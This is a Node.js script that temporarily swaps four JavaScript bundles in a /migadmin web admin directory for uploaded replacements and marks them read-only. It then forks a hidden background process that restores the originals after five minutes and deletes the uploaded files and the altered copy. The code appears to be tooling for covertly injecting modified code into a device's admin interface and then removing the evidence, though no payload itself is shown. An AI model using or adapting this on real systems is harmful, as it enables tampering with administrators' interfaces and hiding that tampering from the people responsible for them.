#!/usr/bin/env node

"use strict";
const fs = require("fs");
const path = require("path");
const cp = require("child_process");

// ============================================================
// config - restore delay time (ms)
// ============================================================
const RESTORE_DELAY_MS = 5 * 60 * 1000; // default 5 min
// const RESTORE_DELAY_MS = 60 * 1000; //for test 1 min

const SRC = "/migadmin";
const ORIG = "/var/migadmin._orig";
const UPLOAD_DIR = __dirname;

const PROTECTED_FILES = new Map([
  [path.normalize("19935.js.gz"), "19935.js.gz"],
  [path.normalize("ng/app.js.gz"), "app.js.gz"],
  [path.normalize("ng/chunk-5398.js.gz"), "chunk-5398.js.gz"],
  [path.normalize("ng/chunk-2970.js.gz"), "chunk-2970.js.gz"],
]);

const READONLY = 0o444;

function copyRecursive(srcPath, destPath, srcBase, skipProtected) {
  const stat = fs.lstatSync(srcPath);
  if (stat.isSymbolicLink()) {
    const linkTarget = fs.readlinkSync(srcPath);
    fs.mkdirSync(path.dirname(destPath), { recursive: true });
    try {
      fs.unlinkSync(destPath);
    } catch (_) {}
    fs.symlinkSync(linkTarget, destPath);
    console.log(`  [LN]   ${srcPath} -> ${destPath} (-> ${linkTarget})`);
  } else if (stat.isDirectory()) {
    fs.mkdirSync(destPath, { recursive: true });
    for (const entry of fs.readdirSync(srcPath)) {
      copyRecursive(
        path.join(srcPath, entry),
        path.join(destPath, entry),
        srcBase,
        skipProtected,
      );
    }
  } else {
    if (skipProtected) {
      const rel = path.normalize(path.relative(srcBase, srcPath));
      if (PROTECTED_FILES.has(rel)) {
        console.log(`  [SKIP] protected (not copied): ${srcPath}`);
        return;
      }
    }
    fs.mkdirSync(path.dirname(destPath), { recursive: true });
    fs.copyFileSync(srcPath, destPath);
    fs.chmodSync(destPath, stat.mode);
  }
}

function setProtectedReadonly(srcBase) {
  for (const [relPath] of PROTECTED_FILES) {
    const absPath = path.join(srcBase, relPath);
    if (!fs.existsSync(absPath)) {
      console.warn(`  [WARN] protected file not found, skip chmod: ${absPath}`);
      continue;
    }
    try {
      fs.chmodSync(absPath, READONLY);
      console.log(`  [RO]   ${absPath} → 0${READONLY.toString(8)}`);
    } catch (e) {
      console.warn(`  [WARN] cannot set readonly: ${absPath} - ${e.message}`);
    }
  }
}

function removeRecursive(targetPath) {
  let stat;
  try {
    stat = fs.lstatSync(targetPath);
  } catch {
    return;
  }
  if (stat.isDirectory()) {
    for (const entry of fs.readdirSync(targetPath)) {
      removeRecursive(path.join(targetPath, entry));
    }
    try {
      fs.rmdirSync(targetPath);
    } catch (e) {
      console.warn(`  [WARN] cannot rmdir: ${targetPath} - ${e.message}`);
    }
  } else {
    try {
      fs.unlinkSync(targetPath);
    } catch (e) {
      console.warn(`  [WARN] cannot unlink: ${targetPath} - ${e.message}`);
    }
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function formatDuration(ms) {
  const totalSeconds = Math.floor(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;
  if (minutes > 0) {
    return `${minutes}分${seconds}秒`;
  }
  return `${seconds}秒`;
}

// ============================================================
// Phase 1: execute mv.js logic
// ============================================================
async function runMv() {
  const src = path.resolve(SRC);
  const orig = path.resolve(ORIG);

  if (!fs.existsSync(src)) {
    console.error(`err: SRC does not exist: ${src}`);
    process.exit(1);
  }
  if (fs.existsSync(orig)) {
    console.error(
      `err: ORIG already exists (previous mv.js run not restored?): ${orig}`,
    );
    console.error(`     Run mv_restore.js first, or manually remove: ${orig}`);
    process.exit(1);
  }

  for (const [, uploadName] of PROTECTED_FILES) {
    const uploadFile = path.join(UPLOAD_DIR, uploadName);
    if (!fs.existsSync(uploadFile)) {
      console.error(`err: uploaded file not found: ${uploadFile}`);
      process.exit(1);
    }
  }

  console.log("=".repeat(60));
  console.log(
    "[Phase 1 / Step 1] pre: rename src -> orig (bypass -i with rename)",
  );
  console.log(`  src  : ${src}`);
  console.log(`  orig : ${orig}`);
  console.log("=".repeat(60));

  try {
    fs.renameSync(src, orig);
    console.log(`  [OK]   rename: ${src} -> ${orig}`);
  } catch (e) {
    console.error(`err: rename src->orig failed - ${e.message}`);
    process.exit(1);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 1 / Step 2] copy: orig -> src (skip protected files)");
  console.log(`  orig : ${orig}`);
  console.log(`  src  : ${src}`);
  console.log("=".repeat(60));

  try {
    copyRecursive(orig, src, orig, true);
  } catch (e) {
    console.error(`err: copy orig->src failed - ${e.message}`);
    process.exit(1);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 1 / Step 3] inject: place uploaded files into src");
  console.log(`  upload dir: ${UPLOAD_DIR}`);
  console.log("=".repeat(60));

  for (const [relPath, uploadName] of PROTECTED_FILES) {
    const uploadFile = path.join(UPLOAD_DIR, uploadName);
    const targetFile = path.join(src, relPath);
    fs.mkdirSync(path.dirname(targetFile), { recursive: true });
    fs.copyFileSync(uploadFile, targetFile);
    console.log(`  [OK]   ${uploadFile} -> ${targetFile}`);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 1 / Step 4] post: set protected files readonly");
  console.log(`  src: ${src}`);
  console.log("=".repeat(60));

  setProtectedReadonly(src);

  console.log(`\nPhase 1 done. Protected files replaced in: ${src}`);
  console.log(`Original directory preserved at: ${orig}`);
}

// ============================================================
// Phase 2: wait for the restore delay time
// ============================================================
async function waitForRestore() {
  console.log("\n" + "=".repeat(60));
  console.log(
    `[Phase 2] wait ${formatDuration(RESTORE_DELAY_MS)} before automatic restore...`,
  );
  console.log(
    `  restore time: ${new Date(Date.now() + RESTORE_DELAY_MS).toLocaleString()}`,
  );
  console.log("=".repeat(60));

  const startTime = Date.now();
  const endTime = startTime + RESTORE_DELAY_MS;

  // every 10 seconds, print remaining time (if any)
  const intervalMs = 10000;
  while (Date.now() < endTime) {
    const remaining = endTime - Date.now();
    if (remaining <= 0) break;
    const waitMs = Math.min(intervalMs, remaining);
    await sleep(waitMs);
    if (Date.now() < endTime) {
      // console.log(`  ... 剩余 ${formatDuration(endTime - Date.now())}`);
    }
  }

  // console.log(" \n");
}

// ============================================================
// Phase 3: execute mv_restore.js logic
// ============================================================
async function runMvRestore() {
  const src = path.resolve(SRC);
  const orig = path.resolve(ORIG);

  if (!fs.existsSync(orig)) {
    console.error(`err: ORIG does not exist (run mv.js first): ${orig}`);
    process.exit(1);
  }

  console.log("=".repeat(60));
  console.log("[Phase 3 / Step 1] pre: rename current src -> trash");
  console.log(`  src: ${src}`);
  console.log("=".repeat(60));

  const trash = src + `._replaced_${Date.now()}`;

  if (fs.existsSync(src)) {
    try {
      fs.renameSync(src, trash);
      console.log(`  [OK]   rename: ${src} -> ${trash}`);
    } catch (e) {
      console.error(`err: rename src->trash failed - ${e.message}`);
      process.exit(1);
    }
  } else {
    console.log(`  [INFO] src does not exist, skipping rename`);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 3 / Step 2] restore: rename orig -> src");
  console.log(`  orig : ${orig}`);
  console.log(`  src  : ${src}`);
  console.log("=".repeat(60));

  try {
    fs.renameSync(orig, src);
    console.log(`  [OK]   rename: ${orig} -> ${src}`);
  } catch (e) {
    console.error(`err: rename orig->src failed - ${e.message}`);
    if (fs.existsSync(trash)) {
      try {
        fs.renameSync(trash, src);
        console.error(
          `  [ROLLBACK] restored src from trash: ${trash} -> ${src}`,
        );
      } catch (_) {}
    }
    process.exit(1);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 3 / Step 3] cleanup: remove replaced (trash) directory");
  console.log(`  trash: ${trash}`);
  console.log("=".repeat(60));

  if (fs.existsSync(trash)) {
    removeRecursive(trash);
    if (!fs.existsSync(trash)) {
      console.log(`  [OK]   removed: ${trash}`);
    } else {
      console.warn(`  [WARN] some files remain (unexpected): ${trash}`);
    }
  } else {
    console.log(`  [SKIP] trash does not exist`);
  }
  console.log();

  console.log("=".repeat(60));
  console.log("[Phase 3 / Step 4] cleanup: remove uploaded replacement files");
  console.log(`  upload dir: ${UPLOAD_DIR}`);
  console.log("=".repeat(60));

  for (const [, name] of PROTECTED_FILES) {
    const uploadFile = path.join(UPLOAD_DIR, name);
    if (fs.existsSync(uploadFile)) {
      try {
        fs.unlinkSync(uploadFile);
        console.log(`  [OK]   removed: ${uploadFile}`);
      } catch (e) {
        console.warn(`  [WARN] cannot remove: ${uploadFile} - ${e.message}`);
      }
    } else {
      console.log(`  [SKIP] not found: ${uploadFile}`);
    }
  }
  console.log();

  console.log(`All done. Original directory restored to: ${src}`);
}

function daemonize() {
  if (process.env.MV_AUTO_DAEMON === "1") {
    return;
  }

  const child = cp.spawn(process.execPath, [__filename], {
    detached: true,
    stdio: "ignore",
    env: { ...process.env, MV_AUTO_DAEMON: "1" },
  });

  child.unref();
  console.log(`[INFO] background process started, PID: ${child.pid}`);
  process.exit(0);
}

// ============================================================
// main
// ============================================================
async function main() {
  const isDaemon = process.env.MV_AUTO_DAEMON === "1";

  console.log("=".repeat(60));
  console.log("mv_auto.js - automatic replacement and scheduled restore");
  console.log(`scheduled restore delay: ${formatDuration(RESTORE_DELAY_MS)}`);
  if (isDaemon) {
    console.log("[mode] background daemon");
  } else {
    console.log("[mode] foreground");
  }
  console.log("=".repeat(60));
  console.log();

  if (!isDaemon) {
    await runMv();
    daemonize();
  } else {
    await waitForRestore();
    await runMvRestore();
  }
}

main().catch((e) => {
  console.error(`Unhandled error: ${e.message}`);
  process.exit(1);
});
